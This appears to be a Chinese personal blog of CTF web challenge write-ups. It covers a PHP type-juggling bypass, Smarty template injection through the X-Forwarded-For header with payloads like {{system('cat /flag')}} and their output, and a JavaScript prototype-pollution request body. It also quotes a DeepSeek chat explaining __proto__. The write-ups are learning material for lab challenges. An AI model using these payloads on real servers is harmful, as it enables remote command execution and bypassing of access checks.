<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;final1l1l_challenge.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$a</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$b</span>)) &#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-variable">$b</span>[<span class="hljs-variable">$a</span>]) &#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;noooooooooooo&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;Notice the param type!&#x27;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;Where is your param?&#x27;</span>);<br>&#125; Where is your param?<br></code></pre></td></tr></table></figure>
<p>要求 a和b都不是数字<br>a等于0，并且a的md5值等于b的数组的a?<br>有点乱  </p>
<p>这个绕不过，看到网上有两种解法  </p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1</span>:<br>意思是让我们<span class="hljs-built_in">get</span>输入<span class="hljs-keyword">a</span>，<span class="hljs-built_in">post</span>输入b，且两个变量都不是数字，然后<span class="hljs-keyword">a</span>弱相等等于<span class="hljs-number">0</span>，md5($<span class="hljs-keyword">a</span>)和b的第$<span class="hljs-keyword">a</span>个元素弱相等，那其实只要<span class="hljs-keyword">a</span>第一位数字是字母，md5($<span class="hljs-keyword">a</span>)为经典<span class="hljs-number">0</span>e开头数字，b随便取个<span class="hljs-number">0</span>k就行，构造?<span class="hljs-keyword">a</span>=QNKCDZO,<span class="hljs-built_in">post</span>输入b=<span class="hljs-number">0</span>k就可以了。得到flag。<br><br>出题人自己的解法：<br>后半部分要求是 md5($<span class="hljs-keyword">a</span>) == $b[$<span class="hljs-keyword">a</span>]，有的师傅可能认为这是 md5 绕过，并且说绕不过去。其实只要静下来定睛一看就能看出来，这个表达式其实并没有对 <span class="hljs-keyword">a</span> 参数做出任何限制，全是对 b 的限制。所以细看就能知道，我们要求的是 b[<span class="hljs-keyword">a</span>] 就是 <span class="hljs-keyword">a</span> 的 md5 值。至于如何赋值，请看下文：<br><br>GET: ?<span class="hljs-keyword">a</span>=<span class="hljs-number">0</span><span class="hljs-keyword">a</span><br>POST:<br>b[<span class="hljs-number">0</span><span class="hljs-keyword">a</span>]=e99bb33727d338314912e86fbdec87af<br><br>可以看到，想要传数组，直接把 <span class="hljs-keyword">a</span> 的值丢进中括号就行了。b 的值就是 <span class="hljs-number">0</span><span class="hljs-keyword">a</span> 的 md5 值。<br></code></pre></td></tr></table></figure>
<p>按照出题的说法试了一下<br>a&#x3D;0b<br>b[0b]&#x3D;347017fd1e37a22faf91875981bc4fb3<br>确实可以了<br>原来还可以这样传数组啊  </p>
<h1 id="2019-强网杯-高明的黑客"><a href="#2019-强网杯-高明的黑客" class="headerlink" title="2019 强网杯 高明的黑客"></a>2019 强网杯 高明的黑客</h1><p>下源码看了一眼吓哭了，几千个php文件<br>网上的wp说是用脚本来测试每个php文件里留下的马能否用<br>没做，记一下思路  </p>
<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>打开题目发现有flag一栏，点开发现会显示<br>Your IP is : 192.168.122.15<br>bp抓爆就知道了  </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flag.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: node5.buuoj.cn:<span class="hljs-number">25798</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://node5.buuoj.cn:<span class="hljs-number">25798</span>/index.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><br></code></pre></td></tr></table></figure>
<p>明明是正常的请求头啊  </p>
<p>打开hint看看，里面有说：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- Do you know why i know your ip? --&gt;</span><br></code></pre></td></tr></table></figure>
<p>想到了是要添加ip，但是忘了该怎么自定义请求ip<br>上网搜<br>是<br>X-Forwarded-For:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flag.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: node5.buuoj.cn:<span class="hljs-number">25798</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">111.111.111.111</span><br></code></pre></td></tr></table></figure>
<p>成功回显指定ip<br>不知道为什么传了一次;就再也不能指定ip来回显了  </p>
<p>算了看wp吧<br>看了半天竟然是模板注入  </p>
<p>传了一次传了一次;就再也不能指定ip来回显了<br>这个问题用bp的添加请求头来解决<br>照着wp做就行</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ls</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is :</span><br><span class="language-xml">Fatal error: Uncaught --&gt; Smarty Compiler: Syntax error in template &quot;string:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ls</span>&#125;&#125;</span><span class="language-xml">&quot; on line 1 &quot;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ls</span>&#125;&#125;</span><span class="language-xml">&quot; unknown tag &#x27;ls&#x27; &lt;-- thrown in /var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 1</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is : bootstrap</span><br><span class="language-xml">css</span><br><span class="language-xml">flag.php</span><br><span class="language-xml">header.php</span><br><span class="language-xml">hint.php</span><br><span class="language-xml">img</span><br><span class="language-xml">index.php</span><br><span class="language-xml">jquery</span><br><span class="language-xml">libs</span><br><span class="language-xml">templates_c</span><br><span class="language-xml">templates_c			</span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span> /)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is : <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Fatal error<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>:  Uncaught  --<span class="hljs-symbol">&amp;gt;</span> Smarty Compiler: Syntax error in template <span class="hljs-symbol">&amp;quot;</span>string:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span> /)&#125;&#125;</span><span class="language-xml"><span class="hljs-symbol">&amp;quot;</span>  on line 1 <span class="hljs-symbol">&amp;quot;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span> /)&#125;&#125;</span><span class="language-xml"><span class="hljs-symbol">&amp;quot;</span>  - Unexpected <span class="hljs-symbol">&amp;quot;</span>)<span class="hljs-symbol">&amp;quot;</span> <span class="hljs-symbol">&amp;lt;</span>-- </span><br><span class="language-xml">thrown in <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>/var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> on line <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>1</span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls /&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is : bin</span><br><span class="language-xml">dev</span><br><span class="language-xml">etc</span><br><span class="language-xml">flag</span><br><span class="language-xml">home</span><br><span class="language-xml">lib</span><br><span class="language-xml">media</span><br><span class="language-xml">mnt</span><br><span class="language-xml">opt</span><br><span class="language-xml">proc</span><br><span class="language-xml">root</span><br><span class="language-xml">run</span><br><span class="language-xml">sbin</span><br><span class="language-xml">srv</span><br><span class="language-xml">sys</span><br><span class="language-xml">tmp</span><br><span class="language-xml">usr</span><br><span class="language-xml">var</span><br><span class="language-xml">var				</span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//拿到flag</span><br></code></pre></td></tr></table></figure>
<p>Flask可能存在Jinjia2模版注入漏洞<br>PHP可能存在Twig模版注入漏洞<br>源wp<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/111410565">https://blog.csdn.net/weixin_44037296/article/details/111410565</a></p>
<hr>
<h2 id="title-note-35date-2025-05-14-18-04-40tags-web"><a href="#title-note-35date-2025-05-14-18-04-40tags-web" class="headerlink" title="title: note-35date: 2025-05-14 18:04:40tags: web"></a>title: note-35<br>date: 2025-05-14 18:04:40<br>tags: web</h2><h1 id="Mini-L-CTF-Click-and-Click"><a href="#Mini-L-CTF-Click-and-Click" class="headerlink" title="Mini L-CTF Click and Click"></a>Mini L-CTF Click and Click</h1><p>当初没做出来，去西电CTF平台复现<br>官方wp：<br>先用JavaScript在浏览器控制台刷够10000  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">but = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#app &gt; main &gt; div &gt; button&quot;</span>)<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) &#123;<br>    but.<span class="hljs-title function_">click</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
<p>在bp上看到 http 历史记录<br>发现是没50次发一次包<br>过了1000次后服务器一直回显“按的太快了”<br>回显内容：  </p>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs d">什么叫“前后端分离”啊？（战术后仰）<br><br><span class="hljs-keyword">if</span> ( req.<span class="hljs-keyword">body</span>.point.amount == <span class="hljs-number">0</span> || req.<span class="hljs-keyword">body</span>.point.amount == <span class="hljs-literal">null</span>) &#123; <span class="hljs-keyword">delete</span> req.<span class="hljs-keyword">body</span>.point.amount &#125;<br><br>条件判断：检查 req.<span class="hljs-keyword">body</span>.point.amount 的值是否是 <span class="hljs-number">0</span> 或 <span class="hljs-literal">null</span>。<br>操作：如果满足条件，删除 req.<span class="hljs-keyword">body</span>.point.amount 属性。<br></code></pre></td></tr></table></figure>
<p>官方的最终payload：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;set&quot;</span>,<br>  <span class="hljs-string">&quot;point&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">10000</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>看官方wp思路，就是set amount为零，触发删除amount<br>此时因为amount已经被删除，当调用到point对象里的amount属性时会查询不到，<br>此时java的特性是会去查询他的父对象是否有amount这个属性，若是有，amount就会采用他父对象的值    </p>
<p>DeepSeek:这个__proto__ 是对象访问原型链的入口，通过它可以直接修改对象的“父对象”（原型）  </p>
<p>而我们通过设置__proto__的属性，给他添加一个amount属性，当java查询point的amount属性时因为被删除，所以就会去查询__proto__<br>此时若我们给了__proto__一个amount值，这时__proto__的amount值就会变成point的amount值，达到了绕过  </p>
<h2 id="与deepseek的对话"><a href="#与deepseek的对话" class="headerlink" title="与deepseek的对话"></a>与deepseek的对话</h2><h2 id="我的提问："><a href="#我的提问：" class="headerlink" title="我的提问："></a>我的提问：</h2><p>我对__proto__的作用不太理解，说明一下啊，我没接触过多少java</p>
<h2 id="AI回复："><a href="#AI回复：" class="headerlink" title="AI回复："></a>AI回复：</h2><p>已深度思考（用时 22 秒）</p>
<p>好的，用户之前一直在询问关于CTF题目中的原型链污染漏洞，特别是关于__proto__的作用。现在用户提到自己对__proto__的作用不太理解，并且提到没有接触过多少JavaScript，这说明用户可能是一个刚开始学习JavaScript的新手，或者在CTF中遇到了这个概念，但缺乏相关的背景知识。</p>
<p>首先，我需要确认用户的核心问题：理解__proto__在JavaScript中的作用，以及它如何导致原型链污染。用户之前的问题已经涉及到了原型链污染的攻击步骤，但可能对原型链本身的概念还不清楚，尤其是作为JavaScript的新手，需要从基础讲起。</p>
<p>接下来，我需要考虑如何用简单易懂的语言解释原型链和__proto__。用户可能对面向对象编程中的继承概念不太熟悉，或者对JavaScript的原型继承机制感到陌生。因此，需要用类比和具体的例子来帮助理解。</p>
<p>可能的步骤包括：</p>
<p>1. 解释JavaScript中的对象和原型链的基本概念。</p>
<p>2. 说明__proto__属性是什么，以及它如何指向对象的原型。</p>
<p>3. 演示如何通过修改__proto__来影响其他对象，进而导致原型链污染。</p>
<p>4. 结合之前的CTF题目，说明攻击者如何利用这一点。</p>
<p>需要注意的是，用户可能没有接触过构造函数或prototype属性，所以需要避免使用过于专业的术语，或者如果必须使用，要确保有足够的解释。同时，用户可能需要更多的实际例子来理解抽象的概念。</p>
<p>另外，用户之前的对话中提到“没接触过多少java”，这里可能存在笔误，用户可能指的是JavaScript，而不是Java。需要确认这一点，但在上下文中应该是JavaScript，因为讨论的是CTF中的JS漏洞。</p>
<p>在解释过程中，应避免使用复杂的代码示例，或者如果使用代码，要逐行解释其作用。同时，使用比喻或现实中的类比来帮助用户形成直观的理解，比如家族树、继承链等。</p>
<p>还需要强调为什么原型链污染是危险的，以及在实际开发中如何防止这种漏洞。这不仅能帮助用户理解攻击原理，还能增强他们的安全意识。</p>
<p>最后，总结关键点，确保用户能够抓住核心概念，并可能提供进一步的学习资源或练习建议，以巩固理解。</p>
<p>好的！我来用最简单的方式解释 <code>__proto__</code> 和原型链的概念，即使你完全没接触过 JavaScript 也能理解。我们从“对象”和“继承”这两个核心概念说起。</p>
<hr>
<h3 id="1-JavaScript中的对象"><a href="#1-JavaScript中的对象" class="headerlink" title="1. JavaScript中的对象"></a><strong>1. JavaScript中的对象</strong></h3><p>JavaScript 中几乎所有东西都是<strong>对象</strong>（比如数字、字符串、数组等都可以用对象的形式操作）。对象可以理解为一个“盒子”，里面装着<strong>属性</strong>（键值对）。例如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">    <span class="hljs-comment">// 一个简单的对象</span><br>    <span class="hljs-keyword">const</span> cat = &#123;<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;喵喵&quot;</span>,<br>      <span class="hljs-attr">age</span>: <span class="hljs-number">2</span>,<br>      <span class="hljs-attr">say</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;喵~&quot;</span>); &#125;<br>    &#125;;<br><br>这个 <span class="hljs-string">`cat`</span> 对象有属性 <span class="hljs-string">`name`</span>、<span class="hljs-string">`age`</span> 和方法 <span class="hljs-string">`say()`</span>。<br></code></pre></td></tr></table></figure>
<hr>
<h3 id="2-什么是原型链（Prototype-Chain）？"><a href="#2-什么是原型链（Prototype-Chain）？" class="headerlink" title="2. 什么是原型链（Prototype Chain）？"></a><strong>2. 什么是原型链（Prototype Chain）？</strong></h3><p>JavaScript 的继承机制是通过<strong>原型链</strong>实现的。简单来说：</p>
<ul>
<li><p><strong>每个对象都有一个“爸爸”（原型对象）</strong>。</p>
</li>
<li><p>如果访问一个对象的属性（比如 <code>cat.color</code>），但对象自己没有这个属性，JavaScript 会自动去它的“爸爸”对象里找。</p>
</li>
<li><p>如果“爸爸”也没有，就去“爷爷”对象里找……直到找到或者没有更高层的“祖先”（原型链顶端是 <code>null</code>）。</p>
</li>
</ul>
<p>这种<strong>链式查找机制</strong>就是原型链。</p>
<hr>
<h3 id="3-proto-的作用"><a href="#3-proto-的作用" class="headerlink" title="3. __proto__ 的作用"></a><strong>3. <code>__proto__</code> 的作用</strong></h3><p><code>__proto__</code> 是对象的一个<strong>隐藏属性</strong>（现在更推荐用 <code>Object.getPrototypeOf()</code> 获取），它直接指向对象的“爸爸”（原型对象）。</p>
<h4 id="举个例子："><a href="#举个例子：" class="headerlink" title="举个例子："></a><strong>举个例子：</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 创建一个对象</span><br><span class="hljs-keyword">const</span> animal = &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;动物&quot;</span> &#125;;<br><span class="hljs-keyword">const</span> cat = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;喵喵&quot;</span> &#125;;<br><br><span class="hljs-comment">// 手动设置 cat 的“爸爸”是 animal</span><br>cat.<span class="hljs-property">__proto__</span> = animal;<br><br><span class="hljs-comment">// 访问 cat.type</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">type</span>); <span class="hljs-comment">// 输出 &quot;动物&quot;（从“爸爸”animal继承）</span><br></code></pre></td></tr></table></figure>
<ul>
<li><p><code>cat</code> 自己没有 <code>type</code> 属性。</p>
</li>
<li><p>但因为 <code>cat.__proto__</code> 指向 <code>animal</code>，所以会去 <code>animal</code> 里找 <code>type</code>。</p>
</li>
<li><p>这就是<strong>继承</strong>！</p>
</li>
</ul>
<hr>
<h3 id="4-原型链污染的原理"><a href="#4-原型链污染的原理" class="headerlink" title="4. 原型链污染的原理"></a><strong>4. 原型链污染的原理</strong></h3><p>假设我们修改了一个对象的“爸爸”（原型对象），那么<strong>所有继承这个“爸爸”的对象都会受到影响</strong>！</p>
<h4 id="污染示例："><a href="#污染示例：" class="headerlink" title="污染示例："></a><strong>污染示例：</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">    <span class="hljs-comment">// 普通对象</span><br>    <span class="hljs-keyword">const</span> obj1 = &#123;&#125;;<br>    <span class="hljs-keyword">const</span> obj2 = &#123;&#125;;<br>    <br>    <span class="hljs-comment">// 污染 Object.prototype（所有对象的“爷爷”）</span><br>    obj1.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">hacked</span> = <span class="hljs-string">&quot;被污染了！&quot;</span>;<br>    <br>    <span class="hljs-comment">// 所有对象都会继承这个属性！</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj2.<span class="hljs-property">hacked</span>); <span class="hljs-comment">// 输出 &quot;被污染了！&quot;</span><br><br>*   <span class="hljs-string">`Object.prototype`</span> 是几乎所有对象的“爷爷”。<br>    <br>*   修改它后，所有对象（如 <span class="hljs-string">`obj2`</span>）都会自动继承 <span class="hljs-string">`hacked`</span> 属性。<br>    <br></code></pre></td></tr></table></figure>
<hr>
<h3 id="5-回到CTF题目中的攻击"><a href="#5-回到CTF题目中的攻击" class="headerlink" title="5. 回到CTF题目中的攻击"></a><strong>5. 回到CTF题目中的攻击</strong></h3><p>题目中的请求数据：</p>
<pre><code class="hljs">&#123;
  &quot;point&quot;: &#123;
    &quot;amount&quot;: 0,
    &quot;__proto__&quot;: &#123; &quot;amount&quot;: 10000 &#125;
  &#125;
&#125;
</code></pre>
<h4 id="攻击步骤："><a href="#攻击步骤：" class="headerlink" title="攻击步骤："></a><strong>攻击步骤：</strong></h4><ol>
<li><p><strong>设置 <code>amount: 0</code></strong>：触发后端代码 <code>delete req.body.point.amount</code>，删除对象自身的 <code>amount</code>。</p>
</li>
<li><p><strong>通过 <code>__proto__</code> 修改原型</strong>：将 <code>point</code> 对象的“爸爸”设置为一个包含 <code>amount: 10000</code> 的对象。</p>
</li>
<li><p><strong>继承伪造的 <code>amount</code></strong>：当后端检查 <code>point.amount</code> 时，由于自身属性被删除，会从“爸爸”那里继承 <code>amount: 10000</code>，从而绕过限制。</p>
</li>
</ol>
<hr>
<h3 id="6-类比理解"><a href="#6-类比理解" class="headerlink" title="6. 类比理解"></a><strong>6. 类比理解</strong></h3><p>想象你有一个家族：</p>
<ul>
<li><p><strong>你自己</strong>：有一个钱包（属性），但你把钱包扔了（<code>delete</code>）。</p>
</li>
<li><p><strong>你的爸爸</strong>：你偷偷修改了爸爸的钱包，往里塞了10000元（通过 <code>__proto__</code> 修改原型）。</p>
</li>
<li><p><strong>别人检查你的财产</strong>：发现你没钱包，于是看你爸爸的钱包，认为你有10000元！</p>
</li>
</ul>
<hr>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
<li><p><code>__proto__</code> 是对象访问“爸爸”（原型）的入口。</p>
</li>
<li><p><strong>原型链污染</strong>就是通过修改“爸爸”的属性，影响所有“儿子”对象。</p>
</li>
<li><p>在CTF中，攻击者利用这一点伪造数据，绕过逻辑检查。</p>
</li>
</ul>
<p>这样解释清楚了吗？如果还有疑问，可以随时问我！ 😊</p>
<hr>
<h2 id="title-note-36date-2025-05-24-23-36-51tags-web"><a href="#title-note-36date-2025-05-24-23-36-51tags-web" class="headerlink" title="title: note-36date: 2025-05-24 23:36:51tags: web"></a>title: note-36<br>date: 2025-05-24 23:36:51<br>tags: web</h2><h1 id="SWPUCTF-2021-新生赛-hardrce"><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h1><p>开局给源码，只看一眼  </p>
